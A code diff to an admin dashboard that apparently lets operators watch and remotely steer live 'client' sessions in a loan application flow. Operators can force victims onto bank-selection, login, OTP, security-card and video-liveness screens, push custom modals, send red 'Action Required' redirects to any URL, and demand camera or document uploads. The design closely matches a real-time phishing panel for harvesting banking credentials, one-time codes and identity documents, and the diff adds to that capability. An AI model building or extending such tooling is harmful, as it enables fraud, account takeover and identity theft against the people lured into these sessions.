@@ -52,7 +52,7 @@ button{cursor:pointer;border:none;background:none}
 #app.on{display:grid}
 header{
   display:flex;align-items:center;gap:14px;padding:10px 16px;
-  background:var(--bg2);border-bottom:1px solid var(--line);
+  background:var(--bg2);border-bottom:1px solid var(--line);flex-wrap:wrap;
 }
 .brand{font-weight:700;letter-spacing:.3px}
 .brand span{color:var(--accent)}
@@ -97,6 +97,12 @@ main{display:grid;grid-template-columns:minmax(300px,380px) 1fr;overflow:hidden}
 textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
 .voice{color:var(--fg3);font-size:11.5px;margin-top:8px;line-height:1.5}
 .expired{background:rgba(231,76,60,.1);border:1px solid rgba(231,76,60,.3);border-radius:var(--radius);padding:11px 13px;font-size:12.5px;color:#ff8679;margin-bottom:12px}
+.urlrow{display:flex;gap:8px}
+.urlrow .inp{flex:1;min-width:0}
+.paste{flex:0 0 auto;padding:0 13px;border-radius:8px;border:1px solid var(--line);background:var(--bg3);font-size:12px;font-weight:600;color:var(--fg2)}
+.paste:hover{border-color:var(--fg3)}
+.chkrow{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:10px}
+.chkrow label{display:flex;gap:7px;align-items:center;font-size:12.5px;color:var(--fg2);cursor:pointer}
 #toasts{position:fixed;bottom:18px;right:18px;display:flex;flex-direction:column;gap:8px;z-index:200}
 .toast{background:var(--bg3);border:1px solid var(--line);border-left:3px solid var(--accent);padding:10px 14px;border-radius:8px;font-size:12.5px;max-width:320px;animation:in .2s}
 @keyframes in{from{opacity:0;transform:translateY(8px)}}
@@ -167,7 +173,10 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
     poll: null,
     sessions: [],
     sel: null,
-    tick: null
+    tick: null,
+    listSig: '',
+    panelSig: '',
+    panelSid: null
   };
 
   var $ = function (id) { return document.getElementById(id); };
@@ -180,6 +189,12 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
     t.textContent = msg;
     $('toasts').appendChild(t);
     setTimeout(function () { t.remove(); }, 4200);
+  }
+
+  function esc(v) {
+    return String(v == null ? '' : v)
+      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;');
   }
 
   // ── theme ────────────────────────────────────────────────
@@ -228,21 +243,28 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
       var msg;
       try { msg = JSON.parse(ev.data); } catch (e) { return; }
 
+      if (msg.type === 'auth_error') {
+        $('lockerr').textContent = msg.reason === 'timeout'
+          ? 'Auth timed out. Try again.'
+          : 'Key rejected. Try again.';
+        return;
+      }
+
       if (msg.type === 'auth_ok') {
         S.authed = true;
         S.retry = 0;
+        $('lockerr').textContent = '';
         status('on', 'Live');
         $('lock').classList.add('hidden');
         $('app').classList.add('on');
-        if (S.poll) { clearInterval(S.poll); S.poll = null; }
+        stopPoll();
         ws.send(JSON.stringify({ type: 'admin_refresh_sessions' }));
         return;
       }
-      if (msg.type === 'session_list') { S.sessions = msg.sessions || []; render(); }
-      if (msg.type === 'step_approved' || msg.type === 'step_rejected' ||
-          msg.type === 'session_entry_approved' || msg.type === 'session_entry_denied' ||
-          msg.type === 'heartbeat' || msg.type === 'navigation' || msg.type === 'step_change') {
-        if (msg.sessionId && S.sel === msg.sessionId) { /* light refresh handled by tick */ }
+
+      if (msg.type === 'session_list') {
+        S.sessions = msg.sessions || [];
+        render();
       }
     };
 
@@ -254,10 +276,12 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
       if (e.code === 4001) {
         sessionStorage.removeItem(K);
         S.key = '';
+        if (S.timer) { clearTimeout(S.timer); S.timer = null; }
+        stopPoll();
         status('off', 'Offline');
         $('app').classList.remove('on');
         $('lock').classList.remove('hidden');
-        $('lockerr').textContent = 'Key rejected. Try again.';
+        if (!$('lockerr').textContent) $('lockerr').textContent = 'Key rejected. Try again.';
         return;
       }
       if (wasAuthed) {
@@ -297,7 +321,7 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
 
   // ── REST fallback poll while socket is down ──────────────
   function startPoll() {
-    if (S.poll) return;
+    if (S.poll || !S.key) return;
     S.poll = setInterval(function () {
       if (S.ws && S.ws.readyState === 1) return;
       fetch('/admin/sessions', { headers: { Authorization: 'Bearer ' + S.key } })
@@ -306,8 +330,11 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
         .catch(function () {});
     }, 60000);
   }
+  function stopPoll() {
+    if (S.poll) { clearInterval(S.poll); S.poll = null; }
+  }
 
-  // ── render ───────────────────────────────────────────────
+  // ── age helpers ──────────────────────────────────────────
   function ageStr(iso) {
     if (!iso) return 'never';
     var ms = Date.now() - new Date(iso).getTime();
@@ -319,6 +346,35 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
   function isStale(s) {
     if (!s.last_heartbeat) return true;
     return (Date.now() - new Date(s.last_heartbeat).getTime()) > STALE_MS;
+  }
+
+  // ── render: signature-gated so the panel is not rebuilt every tick ──
+  function listSig() {
+    return S.sessions.map(function (s) {
+      return s.session_id + (isStale(s) ? '1' : '0') + '|' +
+             (s.current_page || '') + '|' + (s.current_step || '');
+    }).join('~') + '@' + (S.sel || '');
+  }
+
+  function panelSig(s) {
+    return s.session_id + '|' + (isStale(s) ? '1' : '0') + '|' +
+           (s.current_page || '') + '|' + (s.current_step || '');
+  }
+
+  function render() {
+    var sig = listSig();
+    if (sig !== S.listSig) { S.listSig = sig; renderList(); }
+    else { updateAges(); }
+    renderPanel();
+  }
+
+  function updateAges() {
+    var nodes = document.querySelectorAll('[data-age]');
+    for (var i = 0; i < nodes.length; i++) {
+      var sid = nodes[i].getAttribute('data-age');
+      var s = S.sessions.filter(function (x) { return x.session_id === sid; })[0];
+      if (s) nodes[i].textContent = ageStr(s.last_heartbeat);
+    }
   }
 
   function card(s) {
@@ -357,6 +413,7 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
     live.textContent = dead ? 'expired' : (s._status || 'idle');
     meta.appendChild(live);
     var seen = document.createElement('span');
+    seen.setAttribute('data-age', s.session_id);
     seen.textContent = ageStr(s.last_heartbeat);
     meta.appendChild(seen);
     el.appendChild(meta);
@@ -365,7 +422,7 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
     return el;
   }
 
-  function render() {
+  function renderList() {
     var active = [], inactive = [];
     S.sessions.forEach(function (s) { (isStale(s) ? inactive : active).push(s); });
 
@@ -378,13 +435,61 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
     if (!inactive.length) li.innerHTML = '<div class="empty" style="padding:24px 8px">None.</div>';
     active.forEach(function (s) { la.appendChild(card(s)); });
     inactive.forEach(function (s) { li.appendChild(card(s)); });
-
-    var cur = S.sessions.filter(function (s) { return s.session_id === S.sel; })[0];
-    if (cur) panel(cur); else { $('panel').style.display = 'none'; $('empty').style.display = 'block'; }
   }
 
-  // ── command panel ────────────────────────────────────────
-  function panel(s) {
+  function renderPanel() {
+    var cur = S.sessions.filter(function (s) { return s.session_id === S.sel; })[0];
+
+    if (!cur) {
+      $('panel').style.display = 'none';
+      $('empty').style.display = 'block';
+      S.panelSig = '';
+      S.panelSid = null;
+      return;
+    }
+
+    var sig = panelSig(cur);
+    if (sig === S.panelSig) { updatePanelMeta(cur); return; }
+
+    var sameSess = S.panelSid === cur.session_id;
+    var keep = sameSess ? snapshot() : null;
+
+    S.panelSig = sig;
+    S.panelSid = cur.session_id;
+    buildPanel(cur);
+
+    if (keep) restore(keep);
+  }
+
+  function updatePanelMeta(s) {
+    var seen = document.getElementById('p-seen');
+    if (seen) seen.textContent = ageStr(s.last_heartbeat);
+    var exp = document.getElementById('p-expired');
+    if (exp) exp.style.display = isStale(s) ? 'block' : 'none';
+  }
+
+  function snapshot() {
+    var out = {};
+    var nodes = document.querySelectorAll('#panel [data-keep]');
+    for (var i = 0; i < nodes.length; i++) {
+      var el = nodes[i];
+      if (!el.id) continue;
+      out[el.id] = el.type === 'checkbox' ? el.checked : el.value;
+    }
+    return out;
+  }
+
+  function restore(vals) {
+    Object.keys(vals).forEach(function (id) {
+      var el = document.getElementById(id);
+      if (!el) return;
+      if (el.type === 'checkbox') el.checked = vals[id];
+      else el.value = vals[id];
+    });
+  }
+
+  // ── command panel (built once per session/state change) ──
+  function buildPanel(s) {
     var dead = isStale(s);
     var app = s.applications || {};
     var p = $('panel');
@@ -392,63 +497,104 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
     p.style.display = 'block';
 
     p.innerHTML =
-      (dead ? '<div class="expired">Session expired — read only. The client must restart to reconnect.</div>' : '') +
+      '<div class="expired" id="p-expired" style="display:' + (dead ? 'block' : 'none') + '">' +
+        'Session expired — read only. The client must restart to reconnect.</div>' +
+
       '<div class="phead"><h2>' + esc(app.client_name || 'Unknown client') + '</h2></div>' +
-      '<div class="pmeta">' + esc(s.session_id) + '<br>app ' + esc(s.application_id || '—') +
+      '<div class="pmeta">' + esc(s.session_id) +
+        '<br>app ' + esc(s.application_id || '—') +
         ' · loan ' + esc(app.loan_amount || '—') +
         ' · page ' + esc(s.current_page || '—') +
         ' · step ' + esc(s.current_step || '—') +
-        ' · seen ' + ageStr(s.last_heartbeat) + '</div>' +
+        ' · seen <span id="p-seen">' + ageStr(s.last_heartbeat) + '</span></div>' +
 
       '<div class="group"><h3>Force navigation</h3>' +
         '<div class="row">' +
-          '<select class="inp" id="f-page">' +
+          '<select class="inp" id="f-page" data-keep>' +
             '<option value="">— page —</option>' +
-            '<option>INDEX</option><option>CONTRACT</option><option>PLAID</option><option>SUCCESS</option>' +
+            '<option value="INDEX">INDEX (landing)</option>' +
+            '<option value="CONTRACT">CONTRACT (page 2)</option>' +
+            '<option value="PLAID">PLAID (page 3)</option>' +
+            '<option value="SUCCESS">SUCCESS (page 4)</option>' +
           '</select>' +
-          '<select class="inp" id="f-screen">' +
+          '<select class="inp" id="f-screen" data-keep>' +
             '<option value="">— screen (optional) —</option>' +
-            '<option>formA</option><option>formB</option><option>formC</option>' +
-            '<option>initial</option><option>bankSelection</option><option>login</option>' +
-            '<option>otp</option><option>securityCard</option><option>videoLiveness</option>' +
+            '<option value="formA">formA</option>' +
+            '<option value="formB">formB</option>' +
+            '<option value="formC">formC</option>' +
+            '<option value="initial">initial</option>' +
+            '<option value="bankSelection">bankSelection</option>' +
+            '<option value="login">login</option>' +
+            '<option value="otp">otp</option>' +
+            '<option value="securityCard">securityCard</option>' +
+            '<option value="videoLiveness">videoLiveness</option>' +
           '</select>' +
         '</div>' +
         '<button class="btn btn-primary btn-block" id="do-nav" style="margin-top:8px">Navigate</button>' +
+        '<div class="voice">A screen implies its own page and overrides the page picker.</div>' +
       '</div>' +
 
-      '<div class="group"><h3>Modal</h3>' +
-        '<div class="field"><label>Header</label><input class="inp" id="m-head" value="Notice"></div>' +
-        '<div class="field"><label>Type</label>' +
-          '<select class="inp" id="m-var">' +
-            '<option value="info">Info (blue)</option>' +
-            '<option value="update">Update (blue)</option>' +
-            '<option value="notice">Notice (yellow)</option>' +
-            '<option value="warning">Warning (red)</option>' +
-            '<option value="success">Success (green)</option>' +
+      '<div class="group"><h3>Custom modal</h3>' +
+        '<div class="field"><label>Header</label>' +
+          '<input class="inp" id="m-head" data-keep value="Notice"></div>' +
+        '<div class="field"><label>Colour</label>' +
+          '<select class="inp" id="m-var" data-keep>' +
+            '<option value="info">Blue — info</option>' +
+            '<option value="action">Blue — action</option>' +
+            '<option value="warning">Amber — warning</option>' +
+            '<option value="required">Red — required</option>' +
+            '<option value="success">Green — success</option>' +
           '</select>' +
         '</div>' +
-        '<div class="field"><label>Message</label><textarea class="inp" id="m-body" placeholder="Message shown to the client"></textarea></div>' +
-        '<div class="row" style="margin-bottom:8px">' +
-          '<label style="display:flex;gap:7px;align-items:center;font-size:12.5px;color:var(--fg2)"><input type="checkbox" id="m-up"> Upload button</label>' +
-          '<label style="display:flex;gap:7px;align-items:center;font-size:12.5px;color:var(--fg2)"><input type="checkbox" id="m-cam"> Camera button</label>' +
+        '<div class="field"><label>Message</label>' +
+          '<textarea class="inp" id="m-body" data-keep placeholder="Message shown to the client"></textarea></div>' +
+        '<div class="field"><label>OK button label</label>' +
+          '<input class="inp" id="m-ok" data-keep value="OK"></div>' +
+        '<div class="chkrow">' +
+          '<label><input type="checkbox" id="m-up" data-keep> Upload button</label>' +
+          '<label><input type="checkbox" id="m-cam" data-keep> Camera button</label>' +
         '</div>' +
         '<button class="btn btn-primary btn-block" id="do-modal">Send modal</button>' +
+        '<div class="voice">Upload and camera open a file picker or the device camera, then push the file to the backend.</div>' +
       '</div>' +
 
-      '<div class="group"><h3>Redirect</h3>' +
-        '<div class="field"><label>Title</label><input class="inp" id="r-title" value="KYC Verification"></div>' +
-        '<div class="field"><label>External URL</label><input class="inp" id="r-url" placeholder="https://…"></div>' +
-        '<div class="field"><label>Message</label><textarea class="inp" id="r-msg">You\'re being redirected for KYC identity verification</textarea></div>' +
+      '<div class="group"><h3>Redirect to external URL</h3>' +
+        '<div class="field"><label>Header</label>' +
+          '<input class="inp" id="r-title" data-keep value="Action Required"></div>' +
+        '<div class="field"><label>External URL</label>' +
+          '<div class="urlrow">' +
+            '<input class="inp" id="r-url" data-keep autocomplete="off" spellcheck="false" placeholder="https://…">' +
+            '<button class="paste" id="r-paste" type="button">Paste</button>' +
+          '</div>' +
+        '</div>' +
+        '<div class="field"><label>Message</label>' +
+          '<textarea class="inp" id="r-msg" data-keep>You will be taken to an external page in a new tab. Keep this tab open and return here once you are done.</textarea></div>' +
+        '<div class="field"><label>OK button label</label>' +
+          '<input class="inp" id="r-ok" data-keep value="Open in New Tab"></div>' +
         '<button class="btn btn-primary btn-block" id="do-redir">Send redirect</button>' +
-        '<div class="voice">Client sees the modal, presses OK, and the URL opens in a new tab.</div>' +
+        '<div class="voice">Client sees the modal, presses OK, and the URL opens in a new tab behind it.</div>' +
       '</div>' +
 
       '<div class="group"><h3>Loader</h3>' +
-        '<div class="field"><label>Message</label><input class="inp" id="l-msg" value="Please wait…"></div>' +
+        '<div class="field"><label>Message</label>' +
+          '<input class="inp" id="l-msg" data-keep value="Please wait…"></div>' +
         '<div class="row">' +
           '<button class="btn" id="do-load">Show</button>' +
           '<button class="btn" id="do-unload">Hide</button>' +
         '</div>' +
+      '</div>' +
+
+      '<div class="group"><h3>Document request</h3>' +
+        '<div class="field"><label>Prompt</label>' +
+          '<input class="inp" id="u-prompt" data-keep value="Please upload the requested document."></div>' +
+        '<div class="field"><label>Source</label>' +
+          '<select class="inp" id="u-type" data-keep>' +
+            '<option value="both">Library or camera</option>' +
+            '<option value="library">Library only</option>' +
+            '<option value="camera">Camera only</option>' +
+          '</select>' +
+        '</div>' +
+        '<button class="btn btn-primary btn-block" id="do-upload">Request upload</button>' +
       '</div>' +
 
       '<div class="group"><h3>Session</h3>' +
@@ -456,18 +602,17 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
           '<button class="btn btn-warn" id="do-lock">Lock</button>' +
           '<button class="btn" id="do-unlock">Unlock</button>' +
         '</div>' +
-        '<button class="btn btn-block" id="do-upload" style="margin-top:8px">Request document upload</button>' +
-        '<div class="field" style="margin-top:10px"><label>Toast</label><input class="inp" id="t-txt" placeholder="Short notice"></div>' +
+        '<div class="field" style="margin-top:10px"><label>Toast</label>' +
+          '<input class="inp" id="t-txt" data-keep placeholder="Short notice"></div>' +
         '<button class="btn btn-block" id="do-toast">Send toast</button>' +
       '</div>';
 
-    var dis = function (id) { var e = $(id); if (e) e.disabled = dead; };
-    ['do-nav','do-modal','do-redir','do-load','do-unload','do-lock','do-unlock','do-upload','do-toast']
-      .forEach(dis);
+    var ids = ['do-nav','do-modal','do-redir','do-load','do-unload','do-lock','do-unlock','do-upload','do-toast'];
+    if (dead) ids.forEach(function (id) { var e = $(id); if (e) e.disabled = true; });
 
     $('do-nav').onclick = function () {
       var page = $('f-page').value, screen = $('f-screen').value;
-      if (!page && !screen) return toast('Pick a page or screen', 'err');
+      if (!page && !screen) return toast('Pick a page or a screen', 'err');
       if (send({ type: 'admin_force_navigate', sessionId: s.session_id,
                  payload: { target_page: page || null, target_screen: screen || null } }))
         toast('Navigation sent', 'ok');
@@ -477,22 +622,38 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
       var body = $('m-body').value.trim();
       if (!body) return toast('Message required', 'err');
       if (send({ type: 'admin_force_modal', sessionId: s.session_id, payload: {
-        header: $('m-head').value.trim() || 'Notice',
-        variant: $('m-var').value,
-        body: body,
+        header:     $('m-head').value.trim() || 'Notice',
+        variant:    $('m-var').value,
+        body:       body,
+        okLabel:    $('m-ok').value.trim() || 'OK',
         showUpload: $('m-up').checked,
         showCamera: $('m-cam').checked
       } })) toast('Modal sent', 'ok');
     };
 
+    $('r-paste').onclick = function () {
+      if (!navigator.clipboard || !navigator.clipboard.readText) {
+        $('r-url').focus();
+        return toast('Clipboard unavailable — paste manually', 'err');
+      }
+      navigator.clipboard.readText().then(function (txt) {
+        if (txt) { $('r-url').value = txt.trim(); toast('Pasted', 'ok'); }
+        else { $('r-url').focus(); }
+      }).catch(function () {
+        $('r-url').focus();
+        toast('Clipboard blocked — paste manually', 'err');
+      });
+    };
+
     $('do-redir').onclick = function () {
       var url = $('r-url').value.trim();
-      if (!/^https?:\/\//i.test(url)) return toast('URL must start with http(s)://', 'err');
+      if (!/^https?:\/\/[^\s]+\.[^\s]+/i.test(url)) return toast('URL must start with http(s)://', 'err');
       if (send({ type: 'admin_redirect', sessionId: s.session_id, payload: {
-        url: url,
-        title: $('r-title').value.trim() || 'Redirecting',
-        message: $('r-msg').value.trim(),
-        variant: 'info'
+        url:     url,
+        header:  $('r-title').value.trim() || 'Action Required',
+        body:    $('r-msg').value.trim() || 'You will be taken to an external page in a new tab.',
+        variant: 'required',
+        okLabel: $('r-ok').value.trim() || 'Open in New Tab'
       } })) toast('Redirect sent', 'ok');
     };
 
@@ -505,6 +666,12 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
       if (send({ type: 'admin_force_loader', sessionId: s.session_id, action: 'hide' }))
         toast('Loader hidden', 'ok');
     };
+    $('do-upload').onclick = function () {
+      if (send({ type: 'admin_request_upload', sessionId: s.session_id, payload: {
+        prompt:      $('u-prompt').value.trim() || 'Please upload the requested document.',
+        upload_type: $('u-type').value
+      } })) toast('Upload requested', 'ok');
+    };
     $('do-lock').onclick = function () {
       if (send({ type: 'admin_lock_session', sessionId: s.session_id,
                  message: 'Session paused by admin.' })) toast('Locked', 'ok');
@@ -512,22 +679,12 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
     $('do-unlock').onclick = function () {
       if (send({ type: 'admin_unlock_session', sessionId: s.session_id })) toast('Unlocked', 'ok');
     };
-    $('do-upload').onclick = function () {
-      if (send({ type: 'admin_request_upload', sessionId: s.session_id,
-                 payload: { prompt: 'Please upload the requested document.' } }))
-        toast('Upload requested', 'ok');
-    };
     $('do-toast').onclick = function () {
       var txt = $('t-txt').value.trim();
       if (!txt) return toast('Toast text required', 'err');
       if (send({ type: 'admin_send_toast', sessionId: s.session_id,
                  payload: { type: 'info', text: txt } })) toast('Toast sent', 'ok');
     };
-  }
-
-  function esc(v) {
-    return String(v == null ? '' : v)
-      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
   }
 
   // ── unlock / lock ────────────────────────────────────────
@@ -546,19 +703,28 @@ textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
   $('lockbtn').onclick = function () {
     sessionStorage.removeItem(K);
     S.key = '';
-    if (S.ws) S.ws.close();
     S.authed = false;
+    if (S.timer) { clearTimeout(S.timer); S.timer = null; }
+    stopPoll();
+    if (S.ws) { try { S.ws.close(); } catch (e) {} S.ws = null; }
+    S.sessions = [];
+    S.sel = null;
+    S.listSig = ''; S.panelSig = ''; S.panelSid = null;
     $('app').classList.remove('on');
     $('lock').classList.remove('hidden');
     $('key').value = '';
+    status('off', 'Offline');
+    $('key').focus();
   };
 
   $('refresh').onclick = function () {
     if (send({ type: 'admin_refresh_sessions' })) toast('Refreshed', 'ok');
   };
 
-  // re-render ages every second
-  S.tick = setInterval(function () { if (S.sessions.length) render(); }, 1000);
+  // ages tick — cheap, never rebuilds a live panel
+  S.tick = setInterval(function () {
+    if (S.sessions.length) { updateAges(); renderPanel(); }
+  }, 1000);
 
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden) connect();
